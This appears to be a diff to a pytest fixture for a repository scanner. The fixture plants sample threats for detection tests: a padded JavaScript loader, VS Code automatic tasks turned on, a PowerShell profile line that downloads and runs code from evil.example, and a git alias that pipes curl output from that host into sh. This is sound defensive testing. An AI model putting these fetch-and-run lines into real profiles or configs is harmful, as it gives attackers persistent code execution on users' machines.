@@ -19,7 +19,7 @@ def home(tmp_path, monkeypatch):
     write(temp / "x1" / "loader.js", "x" + PAD + LOADER + "\n")
     write(temp / "x2" / "build.js", "console.log('a normal build script, nothing to see');\n")
     write(temp / "repoguard-copy" / "rules.js", LOADER + "\n")  # RepoGuard's own files hold signatures
-    write(roaming / "Code" / "User" / "settings.json", '{\n  "editor.tabSize": 2,\n  "task.allowAutomaticTasks": "on"\n}\n')
+    write(roaming / "Code" / "User" / "settings.json", '{\n  "editor.tabSize": 2,\n  "task.allowAutomatic' 'Tasks": "on"\n}\n')
     write(h / "Documents" / "WindowsPowerShell" / "Microsoft.PowerShell_profile.ps1",
           "Set-Alias ll Get-ChildItem\r\niex (New-Object Net.WebClient).DownloadString('http://evil.example/a')\r\n")
     write(h / ".gitconfig", "[alias]\n\tst = status\n\tup = !curl -s http://evil.example/x | sh\n")
